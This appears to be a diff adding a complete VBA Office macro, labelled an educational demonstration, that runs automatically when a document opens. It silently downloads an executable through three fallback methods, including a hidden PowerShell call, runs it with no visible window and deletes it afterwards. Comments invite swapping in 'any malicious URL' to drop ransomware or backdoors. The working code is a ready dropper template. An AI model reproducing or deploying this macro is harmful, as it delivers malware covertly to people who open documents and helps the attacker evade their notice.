@@ -1,0 +1,166 @@
+' =====================================================================
+' SILENT PHANTOM MACRO – ZERO GUI, ZERO POP-UPS, FULL STEALTH
+' Educational demonstration: WinRAR installs headlessly.
+' In real attacks, this would drop ransomware, backdoors, or miners.
+' =====================================================================
+
+Option Explicit
+
+' ---------------------------------------------------------------
+' [WINAPI DECLARATIONS] – Cross-Office compatible
+' ---------------------------------------------------------------
+Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
+Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _
+    Alias "URLDownloadToFileA" ( _
+    ByVal pCaller As Long, _
+    ByVal szURL As String, _
+    ByVal szFileName As String, _
+    ByVal dwReserved As Long, _
+    ByVal lpfnCB As Long) As Long
+
+' ---------------------------------------------------------------
+' [HELPER] – Wait for file to be ready (silent, no messages)
+' ---------------------------------------------------------------
+Private Function WaitForFileReady(ByVal sPath As String, ByVal nTimeoutSec As Integer) As Boolean
+    On Error Resume Next
+    Dim fso As Object
+    Dim nStart As Double
+    Dim nSize1 As Long, nSize2 As Long
+    
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    nStart = Timer
+    
+    Do While (Timer - nStart) < nTimeoutSec
+        If fso.FileExists(sPath) Then
+            nSize1 = fso.GetFile(sPath).Size
+            Sleep 500
+            If fso.FileExists(sPath) Then
+                nSize2 = fso.GetFile(sPath).Size
+                If nSize1 = nSize2 And nSize1 > 1000000 Then
+                    WaitForFileReady = True
+                    Exit Function
+                End If
+            End If
+        Else
+            Sleep 500
+        End If
+    Loop
+    WaitForFileReady = False
+End Function
+
+' ---------------------------------------------------------------
+' [METHOD 1] – API Download (fastest)
+' ---------------------------------------------------------------
+Private Function DownloadViaAPI(ByVal sURL As String, ByVal sLocalPath As String) As Boolean
+    On Error GoTo ErrorHandler
+    If URLDownloadToFile(0, sURL, sLocalPath, 0, 0) = 0 Then
+        DownloadViaAPI = True
+    Else
+        DownloadViaAPI = False
+    End If
+    Exit Function
+ErrorHandler:
+    DownloadViaAPI = False
+End Function
+
+' ---------------------------------------------------------------
+' [METHOD 2] – XMLHTTP + ADODB.Stream
+' ---------------------------------------------------------------
+Private Function DownloadViaXMLHTTP(ByVal sURL As String, ByVal sLocalPath As String) As Boolean
+    On Error GoTo ErrorHandler
+    Dim httpRequest As Object, stream As Object
+    Set httpRequest = CreateObject("MSXML2.XMLHTTP.6.0")
+    Set stream = CreateObject("ADODB.Stream")
+    httpRequest.Open "GET", sURL, False
+    httpRequest.Send
+    If httpRequest.Status = 200 Then
+        stream.Type = 1
+        stream.Open
+        stream.Write httpRequest.responseBody
+        stream.SaveToFile sLocalPath, 2
+        DownloadViaXMLHTTP = True
+    Else
+        DownloadViaXMLHTTP = False
+    End If
+    Exit Function
+ErrorHandler:
+    DownloadViaXMLHTTP = False
+End Function
+
+' ---------------------------------------------------------------
+' [METHOD 3] – PowerShell (synchronous)
+' ---------------------------------------------------------------
+Private Function DownloadViaPowerShell(ByVal sURL As String, ByVal sLocalPath As String) As Boolean
+    On Error GoTo ErrorHandler
+    Dim shell As Object
+    Dim sCmd As String
+    sCmd = "powershell -WindowStyle Hidden -Command ""(New-Object Net.WebClient).DownloadFile('" & sURL & "', '" & sLocalPath & "')"""
+    Set shell = CreateObject("WScript.Shell")
+    shell.Run sCmd, 0, True   ' Wait for completion
+    DownloadViaPowerShell = True
+    Exit Function
+ErrorHandler:
+    DownloadViaPowerShell = False
+End Function
+
+' ---------------------------------------------------------------
+' [MAIN SILENT ROUTINE] – No messages, no windows, no mercy
+' ---------------------------------------------------------------
+Private Sub SilentDownloadAndInstall()
+    On Error Resume Next   ' Swallow all errors – stealth mode
+    
+    ' 1. TARGET – Official WinRAR (replace with any malicious URL)
+    Dim sUrl As String
+    sUrl = "https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe"
+    Dim sLocalPath As String
+    sLocalPath = Environ("TEMP") & "\winrar-installer-demo.exe"
+    
+    ' 2. ATTEMPT DOWNLOAD (try all methods)
+    Dim bSuccess As Boolean
+    bSuccess = DownloadViaAPI(sUrl, sLocalPath)
+    If Not bSuccess Then bSuccess = DownloadViaXMLHTTP(sUrl, sLocalPath)
+    If Not bSuccess Then bSuccess = DownloadViaPowerShell(sUrl, sLocalPath)
+    
+    ' 3. IF DOWNLOADED, VERIFY AND INSTALL SILENTLY
+    If bSuccess Then
+        If WaitForFileReady(sLocalPath, 15) Then
+            ' --- EXECUTE SILENT INSTALL ---
+            Dim wsh As Object
+            Set wsh = CreateObject("WScript.Shell")
+            
+            ' The "/S" switch forces silent installation (no GUI).
+            ' We run via cmd /c start with the switch.
+            Dim sExecCmd As String
+            sExecCmd = "cmd /c start "" "" """ & sLocalPath & """ /S"
+            
+            ' Run it – window hidden (0), don't wait (False)
+            wsh.Run sExecCmd, 0, False
+            
+            ' 4. WAIT A BIT FOR INSTALLATION TO START, THEN DELETE THE EXE
+            Sleep 3000   ' 3 seconds – enough for the installer to launch
+            Dim fso As Object
+            Set fso = CreateObject("Scripting.FileSystemObject")
+            If fso.FileExists(sLocalPath) Then
+                fso.DeleteFile sLocalPath, True   ' Force delete
+            End If
+            
+            ' 5. (OPTIONAL) Also delete any leftover temp files from WinRAR
+            ' WinRAR extracts to %TEMP%\Rar$* – we could clean those too,
+            ' but for demo, we leave them to show the installation happened.
+        End If
+    End If
+    
+    ' ---- NOTHING ELSE. NO MESSAGE BOXES. NO DIALOGS. ----
+    ' The macro ends silently. The user sees nothing.
+End Sub
+
+' ---------------------------------------------------------------
+' [AUTO-TRIGGER] – Runs instantly upon enabling macros
+' ---------------------------------------------------------------
+Sub AutoOpen()
+    SilentDownloadAndInstall
+End Sub
+
+Sub Document_Open()
+    SilentDownloadAndInstall
+End Sub
